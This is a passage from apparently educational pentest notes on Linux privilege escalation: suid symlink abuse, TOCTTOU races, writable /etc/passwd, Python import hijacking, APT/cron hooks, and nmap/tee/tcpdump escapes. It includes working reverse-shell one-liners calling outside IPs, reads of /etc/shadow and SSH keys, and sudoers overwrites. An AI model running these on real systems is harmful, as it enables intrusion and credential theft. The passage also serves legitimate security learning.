<p>Multiple time, we would find that a suid binary belonging to another user is authorized to read a particular file. For example Let’s say there’s a suid binary called readExampleConf which can read a file named example.conf as a suid user. This binary can be tricked into reading any other file by creating a Symlink or a softlink. For example if we want to read /etc/shadow file which can be read by suid user. we can do</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">xxxxxx</span><span class="o">/</span><span class="n">example</span><span class="o">.</span><span class="n">conf</span>
<span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">xxx2</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">xxxxxxx</span><span class="o">/</span><span class="n">example</span><span class="o">.</span><span class="n">conf</span>
</pre></div>
</div>
<p>Now, when we try to read example.conf file, we would be able to read the file for which we created the symlink</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">readExampleConf</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">xxxxxxx</span><span class="o">/</span><span class="n">example</span><span class="o">.</span><span class="n">conf</span>
<span class="o">&lt;</span><span class="n">Contents</span> <span class="n">of</span> <span class="n">shadow</span> <span class="ow">or</span> <span class="n">id_rsa</span><span class="o">&gt;</span>
</pre></div>
</div>
</section>
<section id="directory-symlink">
<h4>Directory Symlink<a class="headerlink" href="#directory-symlink" title="Link to this heading"></a></h4>
<p>Let’s see what happens when we create a symlink of a directory</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span> <span class="n">sym_file</span>
<span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span> <span class="n">sym_fold</span><span class="o">/</span>
</pre></div>
</div>
<p>Here the first one create a direct symlink to the /etc folder and will be shown as</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sym_file</span> <span class="o">-&gt;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span>
</pre></div>
</div>
<p>where as in the second one ( ln -s /etc/ sym_fold/ ), we first create a folder sym_fold and then create a symlink</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sym_fold</span><span class="p">:</span>
<span class="n">total</span> <span class="mi">0</span>
<span class="n">lrwxrwxrwx</span> <span class="mi">1</span> <span class="n">bitvijays</span> <span class="n">bitvijays</span> <span class="mi">5</span> <span class="n">Dec</span>  <span class="mi">2</span> <span class="mi">19</span><span class="p">:</span><span class="mi">31</span> <span class="n">etc</span> <span class="o">-&gt;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span>
</pre></div>
</div>
<p>This might be useful to bypass some filtering, when let’s say a cronjob is running but refuses to take backup of anything named /etc . In that case, we can create a symlink inside a folder and take the backup.</p>
</section>
<section id="time-of-check-to-time-of-use">
<h4>Time of check to time of use<a class="headerlink" href="#time-of-check-to-time-of-use" title="Link to this heading"></a></h4>
<p>In Unix, if a binary program such as below following C code (uses access to check the access of the specific file and to open a specific file), when used in a setuid program, has a TOCTTOU bug:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="s2">&quot;file&quot;</span><span class="p">,</span> <span class="n">W_OK</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">fd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;file&quot;</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="p">);</span>
<span class="o">//</span><span class="n">read</span> <span class="n">over</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span>
<span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</pre></div>
</div>
<p>Here, access is intended to check whether the real user who executed the setuid program would normally be allowed to write the file (i.e., access checks the real userid rather than effective userid). This race condition is vulnerable to an attack:</p>
<p>Attacker</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">//</span>
<span class="o">//</span>
<span class="o">//</span> <span class="n">After</span> <span class="n">the</span> <span class="n">access</span> <span class="n">check</span>
<span class="n">symlink</span><span class="p">(</span><span class="s2">&quot;/etc/shadow&quot;</span><span class="p">,</span> <span class="s2">&quot;file&quot;</span><span class="p">);</span>
<span class="o">//</span> <span class="n">Before</span> <span class="n">the</span> <span class="nb">open</span><span class="p">,</span> <span class="s2">&quot;file&quot;</span> <span class="n">points</span> <span class="n">to</span> <span class="n">the</span> <span class="n">password</span> <span class="n">database</span>
<span class="o">//</span>
<span class="o">//</span>
</pre></div>
</div>
<p>In this example, an attacker can exploit the race condition between the access and open to trick the setuid victim into overwriting an entry in the system password database. TOCTTOU races can be used for privilege escalation, to get administrative access to a machine.</p>
<p>Let’s see how we can exploit this?</p>
<p>In the below code, we are linking the file which we have access (/tmp/hello.txt) and the file which we want to read (and currently don’t have access) (/home/flagXX/token). The f switch on ln makes sure we overwrite the existing symbolic link. We run it in the while true loop to create the race condition.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="k">while</span> <span class="n">true</span><span class="p">;</span> <span class="n">do</span> <span class="n">ln</span> <span class="o">-</span><span class="n">sf</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">hello</span><span class="o">.</span><span class="n">txt</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">token</span><span class="p">;</span> <span class="n">ln</span> <span class="o">-</span><span class="n">sf</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">flagXX</span><span class="o">/</span><span class="n">token</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">token</span> <span class="p">;</span> <span class="n">done</span>
</pre></div>
</div>
<p>We would also run the program in a while loop</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="k">while</span> <span class="n">true</span><span class="p">;</span> <span class="n">do</span> <span class="o">./</span><span class="n">flagXX</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">token</span> <span class="mf">192.168.56.1</span> <span class="p">;</span> <span class="n">done</span>
</pre></div>
</div>
<p>Learning:</p>
<p>Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.</p>
</section>
<section id="writable-etc-passwd-or-account-credentials-came-from-a-legacy-unix-system">
<h4>Writable /etc/passwd or account credentials came from a legacy unix system<a class="headerlink" href="#writable-etc-passwd-or-account-credentials-came-from-a-legacy-unix-system" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Passwords are normally stored in /etc/shadow, which is not readable by users. However, historically, they were stored in the world-readable file /etc/passwd along with all account information.</p></li>
<li><p>For backward compatibility, if a password hash is present in the second column in /etc/passwd, it takes precedence over the one in /etc/shadow.</p></li>
<li><p>Also, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled.</p></li>
<li><p>If passwordless accounts are disabled, you can put the hash of a password of your choice. we can use the mkpasswd to generate password hashes, for example</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span> <span class="n">Usage</span><span class="p">:</span> <span class="n">mkpasswd</span> <span class="p">[</span><span class="n">OPTIONS</span><span class="p">]</span><span class="o">...</span> <span class="p">[</span><span class="n">PASSWORD</span> <span class="p">[</span><span class="n">SALT</span><span class="p">]]</span>
 <span class="n">Crypts</span> <span class="n">the</span> <span class="n">PASSWORD</span> <span class="n">using</span> <span class="n">crypt</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">.</span>

    <span class="o">-</span><span class="n">m</span><span class="p">,</span> <span class="o">--</span><span class="n">method</span><span class="o">=</span><span class="n">TYPE</span>     <span class="n">select</span> <span class="n">method</span> <span class="n">TYPE</span>
    <span class="o">-</span><span class="mi">5</span>                    <span class="n">like</span> <span class="o">--</span><span class="n">method</span><span class="o">=</span><span class="n">md5</span>
    <span class="o">-</span><span class="n">S</span><span class="p">,</span> <span class="o">--</span><span class="n">salt</span><span class="o">=</span><span class="n">SALT</span>       <span class="n">use</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">SALT</span>
    <span class="o">-</span><span class="n">R</span><span class="p">,</span> <span class="o">--</span><span class="n">rounds</span><span class="o">=</span><span class="n">NUMBER</span>   <span class="n">use</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">NUMBER</span> <span class="n">of</span> <span class="n">rounds</span>
    <span class="o">-</span><span class="n">P</span><span class="p">,</span> <span class="o">--</span><span class="n">password</span><span class="o">-</span><span class="n">fd</span><span class="o">=</span><span class="n">NUM</span> <span class="n">read</span> <span class="n">the</span> <span class="n">password</span> <span class="kn">from</span> <span class="nn">file</span> <span class="n">descriptor</span> <span class="n">NUM</span>
                          <span class="n">instead</span> <span class="n">of</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tty</span>
    <span class="o">-</span><span class="n">s</span><span class="p">,</span> <span class="o">--</span><span class="n">stdin</span>           <span class="n">like</span> <span class="o">--</span><span class="n">password</span><span class="o">-</span><span class="n">fd</span><span class="o">=</span><span class="mi">0</span>
    <span class="o">-</span><span class="n">h</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>            <span class="n">display</span> <span class="n">this</span> <span class="n">help</span> <span class="ow">and</span> <span class="n">exit</span>
    <span class="o">-</span><span class="n">V</span><span class="p">,</span> <span class="o">--</span><span class="n">version</span>         <span class="n">output</span> <span class="n">version</span> <span class="n">information</span> <span class="ow">and</span> <span class="n">exit</span>

<span class="n">mkpasswd</span> <span class="n">can</span> <span class="n">generate</span> <span class="n">DES</span><span class="p">,</span> <span class="n">MD5</span><span class="p">,</span> <span class="n">SHA</span><span class="o">-</span><span class="mi">256</span><span class="p">,</span> <span class="n">SHA</span><span class="o">-</span><span class="mi">512</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>It’s possible to gain root access even if you can only append to /etc/passwd and not overwrite the contents. That’s because it’s possible to have multiple entries for the same user, as long as they have different names — users are identified by their ID, not by their name, and the defining feature of the root account is not its name but the fact that it has user ID 0. So you can create an alternate root account by appending a line that declares an account with another name, a password of your choice and user ID 0</p></li>
</ul>
</section>
<section id="elevating-privilege-from-a-suid-binary">
<h4>Elevating privilege from a suid binary<a class="headerlink" href="#elevating-privilege-from-a-suid-binary" title="Link to this heading"></a></h4>
<p>If we have ability to create a suid binary, we can use either</p>
<p>Suid.c</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>int main(void) {
setgid(0); setuid(0);
execl(“/bin/sh”,”sh”,0); }
</pre></div>
</div>
<p>or</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span> <span class="p">{</span>
<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s2">&quot;/bin/bash -p&quot;</span><span class="p">);</span> <span class="p">}</span>
</pre></div>
</div>
<p>However, if we have a unprivileged user, it is always better to check whether /bin/sh is the original binary or a symlink to /bin/bash or /bin/dash. If it’s a symlink to bash, it won’t provide us suid privileges, bash automatically drops its privileges when it’s being run as suid (another security mechanism to prevent executing scripts as suid). So, it might be good idea to copy dash or sh to the remote system, suid it and use it.</p>
<p>More details can be found at <a class="reference external" href="http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html">Common Pitfalls When Writing Exploits</a></p>
</section>
<section id="executing-python-script-with-sudo">
<h4>Executing Python script with sudo<a class="headerlink" href="#executing-python-script-with-sudo" title="Link to this heading"></a></h4>
<p>If there exists a python script which has a import statement and a user has a permission to execute it using sudo.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">display_script</span><span class="o">.</span><span class="n">py</span><span class="o">&gt;</span>

<span class="c1">#!/usr/bin/python3</span>
<span class="kn">import</span> <span class="nn">ftplib</span> <span class="ow">or</span> <span class="kn">import</span> <span class="nn">example</span>
<span class="o">&lt;</span><span class="n">Python</span> <span class="n">code</span> <span class="n">utilizing</span> <span class="n">ftplib</span> <span class="ow">or</span> <span class="n">example</span> <span class="n">calling</span> <span class="n">some</span> <span class="n">function</span><span class="o">&gt;</span>
<span class="nb">print</span> <span class="p">(</span><span class="n">example</span><span class="o">.</span><span class="n">display</span><span class="p">())</span>
</pre></div>
</div>
<p>and is executed using</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">python</span> <span class="n">display_script</span><span class="o">.</span><span class="n">py</span>
</pre></div>
</div>
<p>We can use this to privilege escalate to the higher privileges. As python would imports modules in the current directory first, then from the modules dir (PYTHONPATH), we could make a malicious python script (of the same name of import module such as ftplib or example)
and have it imported by the program. The malicious script may have a function similar to used in example.py executing our command. e.g.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">example</span><span class="o">.</span><span class="n">py</span><span class="o">&gt;</span>
<span class="c1">#!/usr/bin/python3</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">def</span> <span class="nf">display</span><span class="p">():</span>
   <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;whoami&quot;</span><span class="p">)</span>
   <span class="n">exit</span><span class="p">()</span>
</pre></div>
</div>
<p>The result would be “root”. This is mainly because <a class="reference external" href="https://docs.python.org/2/library/sys.html#sys.path">sys.path</a> is populated using the current working directory, followed by directories listed in your PYTHONPATH environment variable, followed by installation-dependent default paths, which are controlled by the site module.</p>
<p><strong>Example</strong></p>
<p>If we run our script with sudo (sudo myscript.py) then the environment variable $USER will be root and the environment variable $SUDO_USER will be the name of the user who executed the command sudo myscript.py. Consider the following scenario:</p>
<p>A linux user bob is logged into the system and possesses sudo privileges. He writes the following python script named myscript.py:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="nb">print</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;USER&quot;</span><span class="p">)</span>
<span class="nb">print</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;SUDO_USER&quot;</span><span class="p">)</span>
</pre></div>
</div>
<p>He then makes the script executable with chmod +x myscript.py and then executes his script with sudo privileges with the command:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="o">./</span><span class="n">myscript</span><span class="o">.</span><span class="n">py</span>
</pre></div>
</div>
<p>The output of that program will be (using python 2.x.x):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">root</span>
<span class="n">bob</span>
</pre></div>
</div>
<p>If bob runs the program without sudo privileges with</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">./</span><span class="n">myscript</span><span class="o">.</span><span class="n">py</span>
</pre></div>
</div>
<p>he will get the following output:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">bob</span>
<span class="kc">None</span>
</pre></div>
</div>
</section>
</section>
<section id="mysql-privileged-escalation">
<h3>MySQL Privileged Escalation<a class="headerlink" href="#mysql-privileged-escalation" title="Link to this heading"></a></h3>
<p>If mysql (version 4.x, 5.x) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize <a class="reference external" href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">User-Defined Function (UDF) Dynamic Library Exploit</a> . Refer <a class="reference external" href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">Gaining a root shell using mysql user defined functions and setuid binaries</a></p>
<section id="more-information">
<h4>More Information<a class="headerlink" href="#more-information" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>The MySQL service should really not run as root. The service and all mysql directories should be run and accessible from another account - mysql as an example.</p></li>
<li><p>When MySQL is initialized, it creates a master account (root by default) that has all privileges to all databases on MySQL. This root account differs from the system root account, although it might still have the same password due to default install steps offered by MySQL.</p></li>
<li><p>Commands can be executed inside MySQL, however, commands are executed as the current logged in user.</p></li>
</ul>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>mysql&gt; \! sh
</pre></div>
</div>
</section>
</section>
<section id="cron-d">
<h3>Cron.d<a class="headerlink" href="#cron-d" title="Link to this heading"></a></h3>
<p>Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.</p>
<section id="pspy">
<h4>pspy<a class="headerlink" href="#pspy" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://github.com/DominicBreuker/pspy">pspy - unprivileged linux process snooping</a>  is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.
Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.</p>
<p>The tool gathers it’s info from procfs scans. Inotify watchers placed on selected parts of the file system trigger these scans to catch short-lived processes. It is a great tool to search for cron jobs running.</p>
</section>
</section>
<section id="unattended-apt-upgrade">
<h3>Unattended APT - Upgrade<a class="headerlink" href="#unattended-apt-upgrade" title="Link to this heading"></a></h3>
<p>If we have a ability to upload files to the host at any location (For. example misconfigured TFTP server) and APT-Update/ Upgrade is running at a set interval (Basically unattended-upgrade or via-a-cronjob), then we can use APT-Conf to run commands</p>
<section id="dpkg">
<h4>DPKG<a class="headerlink" href="#dpkg" title="Link to this heading"></a></h4>
<p>Debconf configuration is initiated with following line. The command in brackets could be any arbitrary command to be executed in shell.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Dpkg</span><span class="p">::</span><span class="n">Pre</span><span class="o">-</span><span class="n">Install</span><span class="o">-</span><span class="n">Pkgs</span> <span class="p">{</span><span class="s2">&quot;/usr/sbin/dpkg-preconfigure --apt || true&quot;</span><span class="p">;};</span>
</pre></div>
</div>
<p>There are also options</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Dpkg</span><span class="p">::</span><span class="n">Pre</span><span class="o">-</span><span class="n">Invoke</span> <span class="p">{</span><span class="s2">&quot;command&quot;</span><span class="p">;};</span>
<span class="n">Dpkg</span><span class="p">::</span><span class="n">Post</span><span class="o">-</span><span class="n">Invoke</span> <span class="p">{</span><span class="s2">&quot;command&quot;</span><span class="p">;};</span>
</pre></div>
</div>
<p>They execute commands before/ after apt calls dpkg. Post-Invoke which is invoked after every execution of dpkg (by an apt tool, not manually);</p>
</section>
<section id="apt">
<h4>APT<a class="headerlink" href="#apt" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>APT::Update::Pre-Invoke {“your-command-here”};</p></li>
<li><p>APT::Update::Post-Invoke-Success, which is invoked after successful updates (i.e. package information updates, not upgrades);</p></li>
<li><p>APT::Update::Post-Invoke, which is invoked after updates, successful or otherwise (after the previous hook in the former case).</p></li>
</ul>
<p>To invoke the above, create a file in  /etc/apt/apt.conf.d/ folder specifying the NN&lt;Name&gt; and keep the code in that</p>
<p>For example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">APT</span><span class="p">::</span><span class="n">Update</span><span class="p">::</span><span class="n">Post</span><span class="o">-</span><span class="n">Invoke</span><span class="p">{</span><span class="s2">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f&quot;</span><span class="p">;};</span>
</pre></div>
</div>
<p>When the apt-update would be executed, it would be executed as root and we would get a shell as a root.</p>
</section>
</section>
<section id="sudo-l-permissions">
<h3>SUDO -l Permissions<a class="headerlink" href="#sudo-l-permissions" title="Link to this heading"></a></h3>
<p>Let’s see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find,  zip and package installers (pip, npm).</p>
<section id="nmap-suid">
<h4>nmap suid<a class="headerlink" href="#nmap-suid" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span> <span class="o">&lt;</span><span class="p">(</span><span class="n">echo</span> <span class="s1">&#39;require &quot;os&quot;.execute &quot;/bin/sh&quot;&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">interactive</span>
</pre></div>
</div>
</section>
<section id="tee-suid">
<h4>tee suid<a class="headerlink" href="#tee-suid" title="Link to this heading"></a></h4>
<p>If tee is suid: tee is used to read input and then write it to output and files. That means we can use tee to read our own commands and add them to any_script.sh, which can then be run as root by a user. If some script is run as root, you may also run. For example, let’s say tidy.sh is executed as root on the server, we can write the below code in temp.sh</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">temp</span><span class="o">.</span><span class="n">sh</span>
<span class="n">echo</span> <span class="s2">&quot;example_user ALL=(ALL) ALL&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sudoers</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">chmod</span> <span class="o">+</span><span class="n">w</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sudoers</span> <span class="n">to</span> <span class="n">add</span> <span class="n">write</span> <span class="n">properties</span> <span class="n">to</span> <span class="n">sudoers</span> <span class="n">file</span> <span class="n">to</span> <span class="n">do</span> <span class="n">the</span> <span class="n">above</span>
</pre></div>
</div>
<p>and then</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="n">temp</span><span class="o">.</span><span class="n">sh</span> <span class="o">|</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">tee</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">cleanup</span><span class="o">/</span><span class="n">tidyup</span><span class="o">.</span><span class="n">sh</span>
</pre></div>
</div>
<p>which will add contents of temp.sh to tidyup.sh. (Assuming tidyup.sh is running as root by crontab)</p>
</section>
<section id="tcpdump">
<h4>tcpdump<a class="headerlink" href="#tcpdump" title="Link to this heading"></a></h4>
<p>The “-z postrotate-command” option (introduced in tcpdump version 4.0.0).</p>
<p>Create a temp.sh ( which contains the commands to executed as root )</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">id</span>
<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">nc</span> <span class="mf">192.168.110.1</span> <span class="mi">4444</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
</pre></div>
</div>
<p>Execute the command</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth0</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">W</span> <span class="mi">1</span> <span class="o">-</span><span class="n">G</span> <span class="mi">1</span> <span class="o">-</span><span class="n">z</span> <span class="o">./</span><span class="n">temp</span><span class="o">.</span><span class="n">sh</span> <span class="o">-</span><span class="n">Z</span> <span class="n">root</span>
</pre></div>
</div>
<p>where</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">C</span> <span class="n">file_size</span> <span class="p">:</span> <span class="n">Before</span>  <span class="n">writing</span> <span class="n">a</span> <span class="n">raw</span> <span class="n">packet</span> <span class="n">to</span> <span class="n">a</span> <span class="n">savefile</span><span class="p">,</span> <span class="n">check</span> <span class="n">whether</span> <span class="n">the</span> <span class="n">file</span> <span class="ow">is</span> <span class="n">currently</span> <span class="n">larger</span> <span class="n">than</span> <span class="n">file_size</span> <span class="ow">and</span><span class="p">,</span> <span class="k">if</span> <span class="n">so</span><span class="p">,</span> <span class="n">close</span> <span class="n">the</span> <span class="n">current</span> <span class="n">savefile</span> <span class="ow">and</span> <span class="nb">open</span> <span class="n">a</span> <span class="n">new</span> <span class="n">one</span><span class="o">.</span>  <span class="n">Savefiles</span> <span class="n">after</span> <span class="n">the</span> <span class="n">first</span> <span class="n">savefile</span> <span class="n">will</span> <span class="n">have</span> <span class="n">the</span> <span class="n">name</span> <span class="n">specified</span> <span class="k">with</span> <span class="n">the</span> <span class="o">-</span><span class="n">w</span> <span class="n">flag</span><span class="p">,</span> <span class="k">with</span> <span class="n">a</span> <span class="n">number</span> <span class="n">after</span> <span class="n">it</span><span class="p">,</span> <span class="n">starting</span> <span class="n">at</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">continuing</span> <span class="n">upward</span><span class="o">.</span>  <span class="n">The</span> <span class="n">units</span> <span class="n">of</span> <span class="n">file_size</span> <span class="n">are</span> <span class="n">millions</span> <span class="n">of</span> <span class="nb">bytes</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">000</span><span class="p">,</span><span class="mi">000</span> <span class="nb">bytes</span><span class="p">,</span> <span class="ow">not</span> <span class="mi">1</span><span class="p">,</span><span class="mi">048</span><span class="p">,</span><span class="mi">576</span> <span class="nb">bytes</span><span class="p">)</span><span class="o">.</span>

<span class="o">-</span><span class="n">W</span> <span class="n">Used</span>  <span class="ow">in</span> <span class="n">conjunction</span> <span class="k">with</span> <span class="n">the</span> <span class="o">-</span><span class="n">C</span> <span class="n">option</span><span class="p">,</span> <span class="n">this</span> <span class="n">will</span> <span class="n">limit</span> <span class="n">the</span> <span class="n">number</span> <span class="n">of</span> <span class="n">files</span> <span class="n">created</span> <span class="n">to</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">number</span><span class="p">,</span> <span class="ow">and</span> <span class="n">begin</span> <span class="n">overwriting</span> <span class="n">files</span> <span class="kn">from</span> <span class="nn">the</span> <span class="n">beginning</span><span class="p">,</span> <span class="n">thus</span> <span class="n">creating</span> <span class="n">a</span> <span class="s1">&#39;rotating&#39;</span> <span class="n">buffer</span><span class="o">.</span>  <span class="n">In</span> <span class="n">addition</span><span class="p">,</span> <span class="n">it</span> <span class="n">will</span> <span class="n">name</span> <span class="n">the</span> <span class="n">files</span> <span class="k">with</span> <span class="n">enough</span> <span class="n">leading</span> <span class="mi">0</span><span class="n">s</span> <span class="n">to</span> <span class="n">support</span> <span class="n">the</span> <span class="n">maximum</span> <span class="n">number</span> <span class="n">of</span> <span class="n">files</span><span class="p">,</span> <span class="n">allowing</span> <span class="n">them</span> <span class="n">to</span> <span class="n">sort</span> <span class="n">correctly</span><span class="o">.</span> <span class="n">Used</span> <span class="ow">in</span> <span class="n">conjunction</span> <span class="k">with</span> <span class="n">the</span> <span class="o">-</span><span class="n">G</span> <span class="n">option</span><span class="p">,</span> <span class="n">this</span> <span class="n">will</span> <span class="n">limit</span> <span class="n">the</span> <span class="n">number</span> <span class="n">of</span> <span class="n">rotated</span> <span class="n">dump</span> <span class="n">files</span> <span class="n">that</span> <span class="n">get</span> <span class="n">created</span><span class="p">,</span> <span class="n">exiting</span> <span class="k">with</span> <span class="n">status</span> <span class="mi">0</span> <span class="n">when</span> <span class="n">reaching</span> <span class="n">the</span> <span class="n">limit</span><span class="o">.</span> <span class="n">If</span> <span class="n">used</span> <span class="k">with</span> <span class="o">-</span><span class="n">C</span> <span class="k">as</span> <span class="n">well</span><span class="p">,</span> <span class="n">the</span> <span class="n">behavior</span> <span class="n">will</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">cyclical</span> <span class="n">files</span> <span class="n">per</span> <span class="n">timeslice</span><span class="o">.</span>

<span class="o">-</span><span class="n">z</span> <span class="n">postrotate</span><span class="o">-</span><span class="n">command</span> <span class="n">Used</span> <span class="ow">in</span> <span class="n">conjunction</span> <span class="k">with</span> <span class="n">the</span> <span class="o">-</span><span class="n">C</span> <span class="ow">or</span> <span class="o">-</span><span class="n">G</span> <span class="n">options</span><span class="p">,</span> <span class="n">this</span> <span class="n">will</span> <span class="n">make</span> <span class="n">tcpdump</span> <span class="n">run</span> <span class="s2">&quot; postrotate-command file &quot;</span> <span class="n">where</span> <span class="n">file</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">savefile</span> <span class="n">being</span> <span class="n">closed</span> <span class="n">after</span> <span class="n">each</span> <span class="n">rotation</span><span class="o">.</span> <span class="n">For</span> <span class="n">example</span><span class="p">,</span> <span class="n">specifying</span> <span class="o">-</span><span class="n">z</span> <span class="n">gzip</span> <span class="ow">or</span> <span class="o">-</span><span class="n">z</span> <span class="n">bzip</span> <span class="n">will</span> <span class="n">compress</span> <span class="n">each</span> <span class="n">savefile</span> <span class="n">using</span> <span class="n">gzip</span> <span class="ow">or</span> <span class="n">bzip2</span><span class="o">.</span>

